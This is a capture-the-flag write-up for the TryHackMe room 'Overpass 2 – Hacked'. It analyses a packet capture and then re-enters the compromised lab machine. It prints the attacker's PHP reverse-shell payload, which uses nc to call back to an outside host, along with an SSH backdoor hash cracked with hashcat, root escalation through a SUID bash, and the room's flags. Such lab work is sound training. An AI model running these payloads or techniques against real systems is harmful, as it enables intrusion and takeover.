###### Overpass has been hacked! Can you analyse the attacker's actions and hack back in?
Room: https://tryhackme.com/room/overpass2hacked
##

After downloading the **overpass2.pcapng** file, we can open it using Wireshark.  

Filteringi the results using **tcp.stream eq 0** we can easily find a GET Request from **/development** directory.  

```
GET /development/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "588-5aae9add656f8-gzip"

HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:33:53 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 01:38:24 GMT
ETag: "588-5aae9add656f8-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 675
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

..........uTMo.0...W0:.s.v.Vv....aH..........!.I.a.}.l.I....P...#.>.\>.~.<A..]..p..B.3..C.1.......
..O2.4.m.....d.;KG~..z@I.[-...b....pR.>.f.....b..3.
....".}..........
\]:ln...+..q......p...8..K6_#...o.`..C^y..A..A*.h...7..Oy#.YDL.....|..iu?.C...v.~.....8....._[.'7#vC..j.Pi.}...Z..U......k.e.w[.B..-G.$....."P..kVr1qf...sQ.......k...
...xM.3..{....z..#..c5<.xd.+}...`M ..AE74a"M.r...=..u
r......%...T..!R~.v.e..SNA....S......c.9..?....F.L.../.f.....T.k$..m.%......z.....m..f.IDh...G@..;...6......0..=..z.9..M.i,.]...*(k
...qA..............1n:.T+\..g&E..H..6M.E.3l...J.V.5%b.p...'$#."..xjH..Q^D.<O.J.LK.....;...#.<K.J..8.....3.n.(Rd'tG?.
.c.1..8...^..N....7..7.s............
```

If we follow that TCP STREAM, the next stream reveals us that the payload was uploaded to **/development/uploads/payload.php**.   

**payload content**   
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

Fast forward to Stream 3, we see that user **james**'s password is **whenevernoteartinstant**.    
```
su james
Password: whenevernoteartinstant
james@overpass-production:/var/www/html/development/uploads$ cd ~
```

Also, the attackers downloaded a SSH-Backdoor from [here](https://github.com/NinjaJc01/ssh-backdoor).    

**default hash for backdoor**  
```
bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```
**hardcoded backdoor salt**   
```
1c362db832f3f864c8c2fe05f2002a05
```
Both the default hash and the salt can be found if we check the source code [here](https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go).    

**backdoor hash the attacker used**  
```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

I used a hash analyzer and the discovered that the hash is SHA-512.  
**hashcat -m 1710 hash /usr/share/wordlists/rockyou.txt**  

**syntax of the content from hash**
```
hash:salt
```

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```

So the hash was cracked. The password is **november16**.   

To connect back to the machine, we can authenticate via SSH james:november16.  
Note that the SSH is open on port 2222, not on port 22.  

**First flag is located at /home/james and is thm{d119b4fa8c497ddb0525f7ad200e6567}** **[1]**.  

Also, on the home directory of user james, we can see something interesting.  
```
-rwsr-sr-x 1 root  root  1.1M Jul 22  2020 .suid_bash
```

Note the SUID bit set for that binary, meaning we can run bash with elevated privileges.

**./.suid_bash -p**
```
.suid_bash-4.4# whoami
root
```

**Second flag, at /root/root.txt is thm{d53b2684f169360bb9606c333873144d}** **[2]**.  


